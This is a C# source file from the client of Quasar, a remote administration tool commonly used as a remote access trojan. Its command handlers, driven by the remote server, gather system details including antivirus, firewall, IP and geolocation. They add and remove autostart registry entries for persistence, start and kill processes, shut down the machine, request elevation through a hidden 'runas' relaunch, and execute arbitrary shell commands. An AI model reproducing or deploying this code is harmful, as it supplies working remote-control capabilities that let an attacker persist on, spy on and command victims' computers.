using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using Microsoft.Win32;
using Quasar.Client.Config;
using Quasar.Client.Data;
using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Extensions;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Models = Quasar.Common.Models;
using Process = System.Diagnostics.Process;

namespace Quasar.Client.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleGetDrives(GetDrives command, Networking.Client client)
        {
            DriveInfo[] driveInfos;
            try
            {
                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                client.Send(new SetStatusFileManager {Message = "GetDrives I/O error", SetLastDirectorySeen = false});
                return;
            }
            catch (UnauthorizedAccessException)
            {
                client.Send(new SetStatusFileManager {Message = "GetDrives No permission", SetLastDirectorySeen = false});
                return;
            }

            if (driveInfos.Length == 0)
            {
                client.Send(new SetStatusFileManager {Message = "GetDrives No drives", SetLastDirectorySeen = false});
                return;
            }

            Models.Drive[] drives = new Models.Drive[driveInfos.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                try
                {
                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].VolumeLabel,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat)
                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat);

                    drives[i] = new Models.Drive
                        { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
                }
                catch (Exception)
                {
                    
                }
            }

            client.Send(new GetDrivesResponse {Drives = drives});
        }

        public static void HandleDoShutdownAction(DoShutdownAction command, Networking.Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Action)
                {
                    case ShutdownAction.Shutdown:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Restart:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Standby:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Action failed: {ex.Message}"});
            }
        }

        public static void HandleGetStartupItems(GetStartupItems command, Networking.Client client)
        {
            try
            {
                List<Models.StartupItem> startupItems = new List<Models.StartupItem>();

                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Models.StartupItem
                                {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun});
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Models.StartupItem
                                {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce});
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Models.StartupItem
                                {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun});
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Models.StartupItem
                                {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce});
                        }
                    }
                }
                if (PlatformHelper.Is64Bit)
                {
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                    {
                        if (key != null)
                        {
                            foreach (var item in key.GetKeyValues())
                            {
                                startupItems.Add(new Models.StartupItem
                                    {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64Run});
                            }
                        }
                    }
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                    {
                        if (key != null)
                        {
                            foreach (var item in key.GetKeyValues())
                            {
                                startupItems.Add(new Models.StartupItem
                                {
                                    Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64RunOnce
                                });
                            }
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(files.Where(file => file.Name != "desktop.ini").Select(file => new Models.StartupItem
                        {Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu}));
                }

                client.Send(new GetStartupItemsResponse {StartupItems = startupItems});
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Getting Autostart Items failed: {ex.Message}"});
            }
        }

        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Networking.Client client)
        {
            try
            {
                switch (command.StartupItem.Type)
                {
                    case StartupType.LocalMachineRun:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.LocalMachineRunOnce:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.CurrentUserRun:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.CurrentUserRunOnce:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.LocalMachineWoW64Run:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.LocalMachineWoW64RunOnce:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.StartMenu:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            command.StartupItem.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.StartupItem.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.StartupItem.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Adding Autostart Item failed: {ex.Message}"});
            }
        }

        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Networking.Client client)
        {
            try
            {
                switch (command.StartupItem.Type)
                {
                    case StartupType.LocalMachineRun:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineRunOnce:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.CurrentUserRun:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.CurrentUserRunOnce:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineWoW64Run:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineWoW64RunOnce:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.StartMenu:
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.StartupItem.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("File does not exist");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Removing Autostart Item failed: {ex.Message}"});
            }
        }

        public static void HandleGetSystemInfo(GetSystemInfo command, Networking.Client client)
        {
            try
            {
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";

                List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                {
                    new Tuple<string, string>("Processor (CPU)", DevicesHelper.GetCpuName()),
                    new Tuple<string, string>("Memory (RAM)", $"{DevicesHelper.GetTotalRamAmount()} MB"),
                    new Tuple<string, string>("Video Card (GPU)", DevicesHelper.GetGpuName()),
                    new Tuple<string, string>("Username", WindowsAccountHelper.GetName()),
                    new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
                    new Tuple<string, string>("Domain Name", domainName),
                    new Tuple<string, string>("Host Name", hostName),
                    new Tuple<string, string>("System Drive", Path.GetPathRoot(Environment.SystemDirectory)),
                    new Tuple<string, string>("System Directory", Environment.SystemDirectory),
                    new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
                    new Tuple<string, string>("MAC Address", DevicesHelper.GetMacAddress()),
                    new Tuple<string, string>("LAN IP Address", DevicesHelper.GetLanIp()),
                    new Tuple<string, string>("WAN IP Address", GeoLocationHelper.GeoInfo.Ip),
                    new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
                    new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
                    new Tuple<string, string>("Time Zone", GeoLocationHelper.GeoInfo.Timezone),
                    new Tuple<string, string>("Country", GeoLocationHelper.GeoInfo.Country),
                    new Tuple<string, string>("ISP", GeoLocationHelper.GeoInfo.Isp)
                };

                client.Send(new GetSystemInfoResponse {SystemInfos = lstInfos});
            }
            catch
            {
            }
        }

        public static void HandleGetProcesses(GetProcesses command, Networking.Client client)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Models.Process[pList.Length];

            for (int i = 0; i < pList.Length; i++)
            {
                var process = new Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle
                };
                processes[i] = process;
            }

            client.Send(new GetProcessesResponse {Processes = processes});
        }

        public static void HandleDoProcessStart(DoProcessStart command, Networking.Client client)
        {
            if (string.IsNullOrEmpty(command.ApplicationName))
            {
                client.Send(new SetStatus {Message = "Process could not be started!"});
                return;
            }

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    FileName = command.ApplicationName
                };
                Process.Start(startInfo);
            }
            catch
            {
                client.Send(new SetStatus {Message = "Process could not be started!"});
            }
            finally
            {
                HandleGetProcesses(new GetProcesses(), client);
            }
        }

        public static void HandleDoProcessKill(DoProcessKill command, Networking.Client client)
        {
            try
            {
                Process.GetProcessById(command.Pid).Kill();
            }
            catch
            {
            }
            finally
            {
                HandleGetProcesses(new GetProcesses(), client);
            }
        }

        public static void HandleDoAskElevate(DoAskElevate command, Networking.Client client)
        {
            if (WindowsAccountHelper.GetAccountType() != "Admin")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                MutexHelper.CloseMutex();  // close the mutex so our new process will run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                Program.ConnectClient.Exit();
            }
            else
            {
                client.Send(new SetStatus {Message = "Process already elevated."});
            }
        }
        
        public static void HandleDoShellExecute(DoShellExecute command, Networking.Client client)
        {
            string input = command.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell();

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
                _shell.Dispose();
        }
    }
}
